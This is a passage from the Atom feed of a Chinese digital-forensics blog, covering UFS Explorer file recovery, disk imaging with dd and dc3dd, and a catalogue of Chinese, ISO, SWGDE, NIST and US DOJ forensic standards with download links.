XFS, JFS, ReiserFS, UFS, UFS2, Adaptec UFS, big-endian UFS, Btrfs, F2FS;</p><p>BSD/Solaris: ZFS volumes;</p><p>VMware: VMFS, VMFS6.</p><ul><li><strong>仅支持数据访问</strong></li></ul><p>macOS: HFS;</p><p>Novell: NWFS, NSS, NSS64;</p><p>IBM/Microsoft: HPFS.</p><ul><li><strong>支持虚拟构建、读取和恢复数据</strong></li></ul><p>自动识别已知的RAID元数据，保存和编辑RAID配置。</p><p>自动重构LVM, Apple Software RAID, Intel Matrix等。</p><p>支持最流行的RAID模式，如RAID 0, RAID 1E, RAID 3, RAID 5, RAID 6, RAID 7等。</p><p>RAID-on-RAID支持:RAID级别10,50,60,50e等。</p><p>通过RDL或Runtime VIM支持自定义RAID模式支持带ZFS和RAID-Z的“stripe”卷(RAID-Z, RAID-Z2, RAID-Z3)利用坏扇区映射，在出现缺陷(读取错误)时，可自适应重构RAID 5、RAID 6、RAID 5E、RAID 1、RAID 10、RAID0+1和嵌套RAID(级别50、51、60、61等)虚拟磁盘的RAID组件</p><p>支持Drobo BeyondRAID, Synology Hybrid RAID, Btrfs-RAID从降级RAID 5、RAID 10等的Dell EqualLogic存储阵列恢复到双降级RAID 6、RAID 60;卷数据恢复(使用外部数据映射)</p><ul><li><strong>支持软件加密存储</strong></li></ul><p>全盘加密</p><p>LUKS（卢卡斯）加密</p><p>Apple FileVault 2加密</p><p>Apple APFS卷的加密</p><p>文件系统转换(ecryptf)</p><p>BitLocker和BitLocker加密</p><ul><li><strong>支持虚拟技术:</strong></li></ul><p>VMware VMDK, Hyper-V VHD/VHDX, QEMU/XEN QCOW/QCOW2, VirtualBox VDI, Apple DMG, parallels, EnCase E01和Ex01非加密文件，简单磁盘镜像</p><p>内部稀疏格式</p><p>支持驱动器作为磁盘映像(适用于XEN和其他类型)</p><p>Synology稀疏iSCSI</p><p>以虚拟磁盘的形式在存储器中打开分区/文件</p><p>支持分裂DeepSpar DDI图像</p><p>自定义运行时软件的“虚拟映像”文件</p><p>R-Studio图像文件(RDR文件格式)</p><p>使用外部映射或识别给定模式在磁盘映像上动态定义虚拟坏块</p><p>使用MRT数据恢复工具创建的磁盘映像(将文件映像块排序并组合到一个映像文件中)</p><h2 id="使用手册："><a href="#使用手册：" class="headerlink" title="使用手册："></a>使用手册：</h2><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><p><a href="https://www.ufsexplorer.com/solutions/recover-deleted-files.php">https://www.ufsexplorer.com/solutions/recover-deleted-files.php</a></p><p>此通用方法将帮助您轻松执行该过程并恢复意外删除的文件：</p><ol><li>将UFS资源管理器下载并安装到磁盘上，而不要保留要恢复的一个已删除文件。确保程序的下载版本与将在其上运行的操作系统平台相对应。<img src="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/UFS%20explorer%20professional%20recovery(win:mac:linux)/1617606894957-c788f735-ab42-4299-bc4b-f78b1577f302.png" class="" title="image"></li><li>如果需要，请运行该应用程序并在设置表中调整软件设置。<img src="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/UFS%20explorer%20professional%20recovery(win:mac:linux)/1617606894732-09097031-bbf6-4c92-b911-228d7301bb16.png" class="" title="image"></li><li>连接包含您需要取回的已删除数据的存储设备。您可以选择对您的设备类型有效的任何直接连接类型。</li><li>在UFS Explorer的左窗格中的已连接存储列表中选择有问题的设备或逻辑卷，然后使用相应的按钮或存储上下文菜单选项对其进行扫描以查找丢失的数据。<img src="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/UFS%20explorer%20professional%20recovery(win:mac:linux)/1617606894922-80fd51dc-6e47-4f14-98bb-96381200a8e6.png" class="" title="image"></li><li>设置所需的扫描参数。如果您希望更快地完成该过程，则可以禁用InelliRAW。按下“开始扫描”按钮，然后等待结果。<img src="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/UFS%20explorer%20professional%20recovery(win:mac:linux)/1617606894937-79e4524c-6400-4f8c-9fff-f31017c75fbc.png" class="" title="image"></li><li>浏览该程序找到的文件，然后选择要恢复的文件。您可以按名称，日期，类型对它们进行排序，使用快速和高级搜索选项，也可以在内部查看器中预览它们。<img src="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/UFS%20explorer%20professional%20recovery(win:mac:linux)/1617606894937-10ada807-2a0a-46b0-a866-88d778636683.png" class="" title="image"></li><li>将所选文件保存到备用驱动器，外部存储器或网络位置。目标存储必须不同于从中恢复已删除数据的磁盘。<img src="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/UFS%20explorer%20professional%20recovery(win:mac:linux)/1617606895011-afae5beb-0564-4921-a395-73eba16dafcd.png" class="" title="image"></li></ol><p>其他详细信息将取决于您使用的操作系统，设备的类型，或者在某些情况下取决于已删除文件的格式，这些信息在相应的文章中提供。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.ufsexplorer.com/solutions/recover-deleted-files-windows.php">https://www.ufsexplorer.com/solutions/recover-deleted-files-windows.php</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;官网 &lt;a href=&quot;https://www.ufsexplorer.com/ufs-explorer-professional-recovery.php&quot;&gt;https://www.ufsexplorer.com/ufs-explorer-professional-rec</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://xtpeeps.cn/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/dd:dc3dd(linux)/"/>
    <id>https://xtpeeps.cn/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/dd:dc3dd(linux)/</id>
    <published>2021-04-24T10:01:45.595Z</published>
    <updated>2021-04-24T10:03:13.186Z</updated>
    
    <content type="html"><![CDATA[<p>dd镜像取证</p><p>在一些无法使用工具的特殊情况下可以考虑dd做镜像，注意不要将镜像保存到被取证硬盘中，覆盖磁盘造成证据现场破坏。</p><h2 id="使用dd做磁盘镜像"><a href="#使用dd做磁盘镜像" class="headerlink" title="使用dd做磁盘镜像"></a>使用dd做磁盘镜像</h2><h3 id="dd一般镜像方式"><a href="#dd一般镜像方式" class="headerlink" title="dd一般镜像方式"></a>dd一般镜像方式</h3><p>1、fdisk -l 判断目标磁盘编号：</p><p>#if=指定需要制作映像设备，-of=指定保存的位置。</p><p>2、dd if=/dev/sda</p><p>of=/mnt/udisk/Forensic/dd/sda </p><img src="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/dd:dc3dd(linux)/1616135817230-06eb7d84-3b79-492f-b50a-c8949914aeeb.png" class="" title="image"><p>dd速度非常慢，且在备份过程中没有任何进度提示，直接放弃换用增强版dd——dc3dd。</p><h3 id="dd镜像-压缩"><a href="#dd镜像-压缩" class="headerlink" title="dd镜像+压缩"></a>dd镜像+压缩</h3><p>由于dd格式的镜像被取证盘大小就是dd镜像大小，因此一般镜像时还可以带上压缩命令如下</p><p>dd if=/dev/sda3 | gzip &gt; /bak/172_28_179_126/dev_sda3.gz //直接压缩</p><h3 id="dd镜像-压缩-分片"><a href="#dd镜像-压缩-分片" class="headerlink" title="dd镜像+压缩+分片"></a>dd镜像+压缩+分片</h3><p>dd if=/dev/mapper/vg_local_root-lv_home | gzip | split -b 1G -d -a 3 - /bak/172_28_179_126/dev_mapper_vg_local_root-lv_home.dd.gz //分片压缩</p><h2 id="使用dc3dd做磁盘镜像"><a href="#使用dc3dd做磁盘镜像" class="headerlink" title="使用dc3dd做磁盘镜像"></a>使用dc3dd做磁盘镜像</h2><p>dc3dd和dd参数使用是一样的，它们一样是完整备份，对备份盘容量需求比较大，这里只备份sda3（D盘），可以看到备份了约6GB大小。</p><p>dc3dd if=/dev/sda</p><p>of=/mnt/udisk/Forensic/dd/sda </p><img src="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/dd:dc3dd(linux)/1616135817256-129475d5-0273-4dde-9c8d-3f9e798dd80a.png" class="" title="image"><p>最终D盘分区镜像大小5.81GB。</p><img src="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/dd:dc3dd(linux)/1616135817299-e3554a18-bfe8-4f49-a17a-71a1e2cbed27.png" class="" title="image"><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.secpulse.com/archives/138600.html">https://www.secpulse.com/archives/138600.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;dd镜像取证&lt;/p&gt;
&lt;p&gt;在一些无法使用工具的特殊情况下可以考虑dd做镜像，注意不要将镜像保存到被取证硬盘中，覆盖磁盘造成证据现场破坏。&lt;/p&gt;
&lt;h2 id=&quot;使用dd做磁盘镜像&quot;&gt;&lt;a href=&quot;#使用dd做磁盘镜像&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://xtpeeps.cn/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x00%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81%E6%A0%87%E5%87%86/2.0%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81%E6%A0%87%E5%87%86/"/>
    <id>https://xtpeeps.cn/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x00%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81%E6%A0%87%E5%87%86/2.0%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81%E6%A0%87%E5%87%86/</id>
    <published>2021-04-24T09:56:41.196Z</published>
    <updated>2021-04-24T09:56:41.196Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第一部分：国内的相关标准规范"><a href="#第一部分：国内的相关标准规范" class="headerlink" title="第一部分：国内的相关标准规范"></a>第一部分：国内的相关标准规范</h1><p>原文：微信公众号“cnforensics”，微信公众号“取证杂谈”</p><h2 id="国家标准（4）"><a href="#国家标准（4）" class="headerlink" title="国家标准（4）"></a>国家标准（4）</h2><ol><li>GB/T 29360-2012 《电子物证数据恢复检验规程》<a href="http://www.zjcfs.com/style/download/%E6%8A%80%E6%9C%AF%E8%A7%84%E8%8C%83/%E5%A3%B0%E5%83%8F%E7%94%B5%E5%AD%90/GBT29360-2012%E7%94%B5%E5%AD%90%E7%89%A9%E8%AF%81%E6%95%B0%E6%8D%AE%E6%81%A2%E5%A4%8D%E6%A3%80%E9%AA%8C%E8%A7%84%E7%A8%8B.pdf">下载</a></li><li>GB/T 29361-2012 《电子物证文件一致性检验规程》<a href="https://easyforensics.com/media/yizhixing.pdf">下载</a></li><li>GB/T 29362-2012 《电子物证数据搜索检验规程》<a href="http://www.zjcfs.com/style/download/%E6%8A%80%E6%9C%AF%E8%A7%84%E8%8C%83/%E5%A3%B0%E5%83%8F%E7%94%B5%E5%AD%90/GBT29362-2012%E7%94%B5%E5%AD%90%E7%89%A9%E8%AF%81%E6%95%B0%E6%8D%AE%E6%90%9C%E7%B4%A2%E6%A3%80%E9%AA%8C%E8%A7%84%E7%A8%8B.pdf">下载</a></li><li>GB/T 31500-2015 《信息安全技术 存储介质数据恢复服务要求》<a href="http://www.匠工.com/u/1006/1063-d19f52c45c744eff2798e7f2db6de711.pdf">下载</a></li><li>GB/T 39321-2020 《电子合同取证流程规范》即将实施状态 <a href="http://c.gb688.cn/bzgk/gb/showGb?type=online&hcno=E728DB555ADF862CEB7B9B547D51B3F1#page=16&zoom=auto,-130,757">在线</a></li></ol><h2 id="公共安全标准（39）"><a href="#公共安全标准（39）" class="headerlink" title="公共安全标准（39）"></a>公共安全标准（39）</h2><ol><li>GA/T 754-2008 《电子数据存储介质复制工具要求及检测方法》</li><li>GA/T 755-2008 《电子数据存储介质写保护设备要求及检测方法》</li><li>GA/T 756-2008 《数字化设备证据数据发现提取固定方法》</li><li>GA/T 757-2008 《程序功能检验方法》</li><li>GA/T 825-2009 《电子物证数据搜索检验技术规范》（已废止）</li><li>GA/T 826-2009 《电子物证数据恢复检验技术规范》（已废止）</li><li>GA/T 827-2009 《电子物证文件一致性检验技术规范》（已废止）</li><li>GA/T 828-2009 《电子物证软件功能检验技术规范》</li><li>GA/T 829-2009 《电子物证软件一致性检验技术规范》</li><li>GA/T 976-2012 《电子数据法庭科学鉴定通用方法》</li><li>GA/T 977-2012 《取证与鉴定文书电子签名》</li><li>GA/T 978-2012 《网络游戏私服检验技术方法》</li><li>GA/T 1069-2013 《法庭科学电子物证手机检验技术规范》</li><li>GA/T 1070-2013 《法庭科学计算机开关机时间检验技术规范》</li><li>GA/T 1071-2013 《法庭科学电子物证Windows操作系统日志检验技术规范》</li><li>GA/T 1170-2014 《移动终端取证检验方法》</li><li>GA/T 1171-2014 《芯片相似性比对检验方法》</li><li>GA/T 1172-2014 《电子邮件检验技术方法》</li><li>GA/T 1173-2014 《即时通讯记录检验技术方法》</li><li>GA/T 1174-2014 《电子证据数据现场获取通用方法》</li><li>GA/T 1175-2014 《软件相似性检验技术方法》</li><li>GA/T 1176-2014 《网页浏览器历史数据检验技术方法》</li><li>GA/T 1474-2018 《法庭科学计算机系统用户操作行为检验技术规范》</li><li>GA/T 1475-2018 《法庭科学电子物证监控录像机检验技术规范》</li><li>GA/T 1476-2018 《法庭科学远程主机数据获取技术规范》</li><li>GA/T 1477-2018 《法庭科学计算机系统接入外部设备使用痕迹检验技术规范》</li><li>GA/T 1478-2018 《法庭科学网站数据获取技术规范》</li><li>GA/T 1479-2018 《法庭科学电子物证伪基站电子数据检验技术规范》</li><li>GA/T 1480-2018 《法庭科学计算机操作系统仿真检验技术规范》</li><li>GA/T 1554-2019 《法庭科学电子物证检验材料保存技术规范》</li><li>GA/T 1564-2019 《法庭科学 现场勘查电子物证提取技术规范》</li><li>GA/T 1568-2019 《法庭科学 电子物证检验术语》</li><li>GA/T 1569-2019 《法庭科学 电子物证检验实验室建设规范》</li><li>GA/T 1570-2019 《法庭科学 数据库数据真实性检验技术规范》</li><li>GA/T 1571-2019 《法庭科学 Android系统应用程序功能检验方法》</li><li>GA/T 1572-2019 《法庭科学 移动终端地理位置信息检验技术方法》</li><li>GA/T 1663-2019 《法庭科学 Linux操作系统日志检验技术规范》</li><li>GA/T 1664-2019 《法庭科学 MS SQL Server数据库日志检验技术规范》</li><li>GA/T 1713-2020 《法庭科学 破坏性程序检验技术方法》</li></ol><h2 id="司法鉴定技术规范（15）"><a href="#司法鉴定技术规范（15）" class="headerlink" title="司法鉴定技术规范（15）"></a>司法鉴定技术规范（15）</h2><ol><li>SF/Z JD0400001-2014 《电子数据司法鉴定通用实施规范》<a href="http://www.ssfjd.com/Files/jsgf/3/8%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%B8%E6%B3%95%E9%89%B4%E5%AE%9A%E9%80%9A%E7%94%A8%E5%AE%9E%E6%96%BD%E8%A7%84%E8%8C%83.pdf">下载</a></li><li>SF/Z JD0401001-2014 《电子数据复制设备鉴定实施规范》<a href="http://www.ssfjd.com/Files/jsgf/3/9%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%A4%8D%E5%88%B6%E8%AE%BE%E5%A4%87%E9%89%B4%E5%AE%9A%E5%AE%9E%E6%96%BD%E8%A7%84%E8%8C%83.pdf">下载</a></li><li>SF/Z JD0402001-2014 《电子邮件鉴定实施规范》<a href="http://www.ssfjd.com/Files/jsgf/3/10%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E9%89%B4%E5%AE%9A%E5%AE%9E%E6%96%BD%E8%A7%84%E8%8C%83.pdf">下载</a></li><li>SF/Z JD0403001-2014 《软件相似性鉴定实施规范》<a href="http://www.ssfjd.com/Files/jsgf/3/11%E8%BD%AF%E4%BB%B6%E7%9B%B8%E4%BC%BC%E6%80%A7%E9%89%B4%E5%AE%9A%E5%AE%9E%E6%96%BD%E8%A7%84%E8%8C%83.pdf">下载</a></li><li>SF/Z JD0400002-2015 《电子数据证据现场获取通用规范》<a href="http://www.ssfjd.com/Files/jsgf/4/27%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E8%AF%81%E6%8D%AE%E7%8E%B0%E5%9C%BA%E8%8E%B7%E5%8F%96%E9%80%9A%E7%94%A8%E8%A7%84%E8%8C%83.pdf">下载</a></li><li>SF/Z JD0401002-2015 《手机电子数据提取操作规范》<a href="http://www.moj.gov.cn/government_service/download/file/file/20170901/4e17e890086b4d969d714e03456b4b29.pdf">下载</a></li><li>SF/Z JD0402002-2015 《数据库数据真实性鉴定规范》<a href="http://www.ssfjd.com/Files/jsgf/4/24%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%B0%E6%8D%AE%E7%9C%9F%E5%AE%9E%E6%80%A7%E9%89%B4%E5%AE%9A%E8%A7%84%E8%8C%83.pdf">下载</a></li><li>SF/Z JD0402003-2015 《即时通讯记录检验操作规范》<a href="http://www.moj.gov.cn/government_service/download/file/file/20170901/54030516e9634852b11583b7a999392b.pdf">下载</a></li><li>SF/Z JD0403002-2015 《破坏性程序检验操作规范》<a href="http://www.moj.gov.cn/government_service/download/file/file/20170901/78d4d6cd1dbd427fbd41a2613dd89691.pdf">下载</a></li><li>SF/Z JD0403003-2015 《计算机系统用户操作行为检验规范》<a href="http://www.moj.gov.cn/government_service/download/file/file/20170901/1320e071fcad4b4fa47a8290989ed797.pdf">下载</a></li><li>SF/Z JD0402004-2018 《电子文档真实性鉴定技术规范》<a href="http://www.ssfjd.com/Files/jsgf/6/32.pdf">下载</a></li><li>SF/Z JD0403004-2018 《软件功能鉴定技术规范》<a href="http://www.ssfjd.com/Files/jsgf/6/33.pdf">下载</a></li><li>SF/Z JD0404001-2018 《伪基站检验操作规范》<a href="http://www.ssfjd.com/Files/jsgf/6/34.pdf">下载</a></li><li>SF/T 0075—2020 《网络文学作品相似性检验技术规范》<a href="http://www.moj.gov.cn/news/download/file/file/20200604/1591255954644046011.pdf">下载</a></li><li>SF/T 0076-2020 《电子数据存证技术规范》<a href="http://www.ssfjd.com/files/hb2020/0076f-%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%AD%98%E8%AF%81%E6%8A%80%E6%9C%AF%E8%A7%84%E8%8C%83.pdf">下载</a></li><li>SF/T 0077-2020《汽车电子数据检验技术规范》<a href="http://www.ssfjd.com/files/hb2020/0077f-%E6%B1%BD%E8%BD%A6%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E6%A3%80%E9%AA%8C%E6%8A%80%E6%9C%AF%E8%A7%84%E8%8C%83.pdf">下载</a></li></ol><h1 id="其他文件"><a href="#其他文件" class="headerlink" title="其他文件"></a>其他文件</h1><ol><li>《中华全国律师协会律师办理电子数据证据业务操作指引》</li></ol><h1 id="第二部分：国外的相关标准规范"><a href="#第二部分：国外的相关标准规范" class="headerlink" title="第二部分：国外的相关标准规范"></a>第二部分：国外的相关标准规范</h1><h2 id="ISO-IEC电子数据取证标准体系"><a href="#ISO-IEC电子数据取证标准体系" class="headerlink" title="ISO/IEC电子数据取证标准体系"></a>ISO/IEC电子数据取证标准体系</h2><ol><li>ISO/IEC 27035：2011《信息技术-安全技术-信息安全事件管理》</li><li>ISO/IEC 27037:2012《信息技术-安全技术-电子证据识别. 收集. 获取和保存指南》</li><li>ISO/IEC 27038：2014《信息技术-安全技术-数字化修订详述》</li><li>ISO/IEC 27040：2015《信息技术-安全技术-存储安全》</li><li>ISO/IEC 27041《信息技术-安全技术-调查方法适宜性充分性保障指南》</li><li>ISO/IEC 27042《信息技术-安全技术-电子证据分析解释指南》</li><li>ISO/IEC 27043:2015 《信息技术-安全技术-信息技术-安全技术-调查原则和过程》</li><li>ISO/IEC 27044《信息技术-安全技术-安全信息和事件管理指南》</li><li>ISO/IEC 27050《信息技术-安全技术-电子证据发现》</li><li>ISO/IEC 30121：2015《信息技术-电子数据取证风险架构管理》</li></ol><h2 id="SWGDE-手机"><a href="#SWGDE-手机" class="headerlink" title="SWGDE-手机"></a>SWGDE-手机</h2><ol><li>SWGDE Best Practices for Chip-Off [2016-02-08 V1.0下载](<a href="https://www.swgde.org/documents/Current">https://www.swgde.org/documents/Current</a> Documents/SWGDE Best Practices for Chip-Off)</li><li>SWGDE Best Practices for Collection of Damaged Mobile Devices [2016-02-08 V1.1下载](<a href="https://www.swgde.org/documents/Current">https://www.swgde.org/documents/Current</a> Documents/SWGDE Best Practices for Collection of Damaged Mobile Devices)</li><li>SWGDE Best Practices for Examining Mobile Phones Using JTAG [2015-09-29 V1.0下载](<a href="https://www.swgde.org/documents/Current">https://www.swgde.org/documents/Current</a> Documents/SWGDE Best Practices for Examining Mobile Phones Using JTAG)</li><li>SWGDE Best Practices for Mobile Phone Forensics [2013-02-11 V2.0下载](<a href="https://www.swgde.org/documents/Current">https://www.swgde.org/documents/Current</a> Documents/SWGDE Best Practices for Mobile Phone Forensics)</li><li>SWGDE Core Competencies for Mobile Phone Forensics [2013-02-11 V1.0下载](<a href="https://www.swgde.org/documents/Current">https://www.swgde.org/documents/Current</a> Documents/SWGDE Core Competencies for Mobile Phone Forensics)</li></ol><h2 id="SWGDE-计算机"><a href="#SWGDE-计算机" class="headerlink" title="SWGDE-计算机"></a>SWGDE-计算机</h2><ol><li>SWGDE Best Practices for Computer Forensic Acquisitions [2018-04-25 V1.0下载](<a href="https://www.swgde.org/documents/Current">https://www.swgde.org/documents/Current</a> Documents/SWGDE Best Practices for Computer Forensic Acquisitions)</li><li>SWGDE Capture of Live Systems [2014-09-05 V2.0下载](<a href="https://www.swgde.org/documents/Current">https://www.swgde.org/documents/Current</a> Documents/SWGDE Capture of Live Systems)</li><li>SWGDE Best Practices for Handling Damaged Hard Drives [2014-09-05 V1.0下载](<a href="https://www.swgde.org/documents/Current">https://www.swgde.org/documents/Current</a> Documents/SWGDE Best Practices for Handling Damaged Hard Drives)</li><li>SWGDE Best Practices for Computer Forensics [2014-09-05 V3.1下载](<a href="https://www.swgde.org/documents/Current">https://www.swgde.org/documents/Current</a> Documents/SWGDE Best Practices for Computer Forensics)</li></ol><h2 id="美国国家标准于技术研究院（NIST）"><a href="#美国国家标准于技术研究院（NIST）" class="headerlink" title="美国国家标准于技术研究院（NIST）"></a>美国国家标准于技术研究院（NIST）</h2><ol><li>Guidelines on PDA Forensics <a href="https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-72.pdf">下载</a><br>2004年11月1日发布，NIST SP 800-72</li><li>Guide to Integrating Forensic Techniques into Incident Response <a href="https://nvlpubs.nist.gov/nistpubs/legacy/sp/nistspecialpublication800-86.pdf">下载</a><br>2006年9月1日发布，NIST SP 800-86</li><li>Guidelines on Mobile Device Forensic <a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-101r1.pdf">下载</a><br>2014年5月15日发布，NIST SP 800-101 Revision 1</li></ol><h2 id="美国联邦司法部"><a href="#美国联邦司法部" class="headerlink" title="美国联邦司法部"></a>美国联邦司法部</h2><ol><li>Digital Evidence in the Courtroom A Guide for Law Enforcement and Prosecutors <a href="https://www.ncjrs.gov/pdffiles1/nij/211314.pdf">下载</a><br>《法庭中的数据证据：执法部门及检察官操作守则》</li><li>Electronic Crime Scene Investigation An On-the-Scene Reference for First Responders <a href="https://www.ncjrs.gov/pdffiles1/nij/227050.pdf">下载</a><br>《电子犯罪现场调查：第一响应者的现场参考》</li><li>Electronic CrimeScene Investigation A Guide for First Responders <a href="https://www.ncjrs.gov/pdffiles1/nij/219941.pdf">第二版下载</a><br>《电子犯罪现场调查：第一响应者指南》</li><li>Forensic Examination of Digital Evidence A Guide for Law Enforcement <a href="https://www.ncjrs.gov/pdffiles1/nij/199408.pdf">下载</a><br>《数字证据的司法审查：执法人员指南》</li><li>investigations involving the internet and computer networks <a href="https://www.ncjrs.gov/pdffiles1/nij/210798.pdf">下载</a><br>《涉及互联网和计算机网络的调查》</li></ol><h2 id="美国试验与材料学会国际组织"><a href="#美国试验与材料学会国际组织" class="headerlink" title="美国试验与材料学会国际组织"></a>美国试验与材料学会国际组织</h2><ol><li>Standard Guide for Education and Training in Computer Forensics <a href="https://www.astm.org/Standards/E2678.htm">查看详情</a><br>ASTM E2678-09(2014)，2014年最后修订</li><li>StandardPractice for Computer Forensics <a href="https://www.astm.org/Standards/E2763.htm">查看详情</a><br>ASTM E2763-10，2010年最后修订</li><li>Standard Guide for Forensic Digital Image Processing <a href="https://www.astm.org/Standards/E2825.htm">查看详情</a><br>ASTM E2825-18，2018年最后修订</li><li>Standard Guide for Establishing Confidence in Digital Forensic Results by Error Mitigation Analysis <a href="https://www.astm.org/Standards/E3016.htm">查看详情</a><br>ASTM E3016-15e1，2015年最后修订</li><li>Standard Guide for Core Competencies for Mobile Phone Forensics <a href="https://www.astm.org/Standards/E3046.htm">查看详情</a><br>ASTM E3046-15，2015年最后修订</li><li>Standard Practice for Examining Magnetic Card Readers <a href="https://www.astm.org/Standards/E3017.htm">查看详情</a><br>ASTM E3017-15，2015年最后修订</li></ol><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ol><li>Good Practice Guide for Digital Evidence <a href="http://www.digital-detective.net/digital-forensics-documents/ACPO_Good_Practice_Guide_for_Digital_Evidence_v5.pdf">下载</a><br>英国警察协会（ACPO）《数字证据良好操作指南》</li><li>Best Practices For Seizing Electronic Evidence v.3 - A Pocket Guidefor First Responders <a href="http://www.crime-scene-investigator.net/SeizingElectronicEvidence.pdf">下载</a><br>美国特勤局，2007年发布</li><li>Searching and Seizing Computers and Obtaining Electronic Evidence in Criminal Investigations <a href="https://www.justice.gov/sites/default/files/criminal-ccips/legacy/2015/01/14/ssmanual2009.pdf">下载</a></li></ol><h1 id="第三部分：参考资料及说明"><a href="#第三部分：参考资料及说明" class="headerlink" title="第三部分：参考资料及说明"></a>第三部分：参考资料及说明</h1><ol><li><a href="http://www.cnforensics.com/">取证中国论坛</a></li><li><a href="http://www.moj.gov.cn/">中国司法部网站</a></li><li>微信公众号“电子数据取证与鉴定”</li><li><a href="https://www.ncjrs.gov/">美国联邦司法部网站</a></li><li><a href="https://www.swgde.org/">数字证据科学工作组</a></li><li><a href="https://csrc.nist.gov/publications">美国国家标准于技术研究院</a></li><li>百度百科“美国电子数据取证标准”词条<br><strong>没有附下载连接的部分标准规范可邮件联系我获取，详见“关于”页面</strong></li></ol><ul><li>本文最初发布在微信公众号“cnforensics”，发布时间为2016年5月23日。</li><li>2018年3月11日发布在本人微信公众号“取证杂谈”。</li><li>2018年9月29日更新内容：更新了部分失效的下载链接</li><li>2018年11月6日更新内容：增加了2018年5个公共安全标准</li><li>2018年11月9日更新内容：增加了遗漏的GA/T 1475-2018 及GA/T 1480-2018两个标准，增加了2018年3个司法鉴定技术规范</li><li>2019年5月29日更新内容：更新并补全了司法鉴定技术规范的下载链接</li><li>2019年7月4日更新内容：增加了公共安全行业标准GA/T 1554-2019</li><li>2019年7月27日更新内容：增加了GA/T 1564-2019等6个公共安全行业标准</li><li>2019年10月24日更新内容：增加了GA/T 1663-2019和GA/T 1664-2019两个公共安全行业标准</li><li>2020年6月25日更新内容：增加了GB/T 31500-2015、GA/T 1713-2020、SF/T 0076-2020、SF/T 0077-2020四个标准</li><li>2021年3月9日更新内容：增加了GB/T 39321-2020和SF/T 0075—2020两个标准</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;第一部分：国内的相关标准规范&quot;&gt;&lt;a href=&quot;#第一部分：国内的相关标准规范&quot; class=&quot;headerlink&quot; title=&quot;第一部分：国内的相关标准规范&quot;&gt;&lt;/a&gt;第一部分：国内的相关标准规范&lt;/h1&gt;&lt;p&gt;原文：微信公众号“cnforensics”，</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
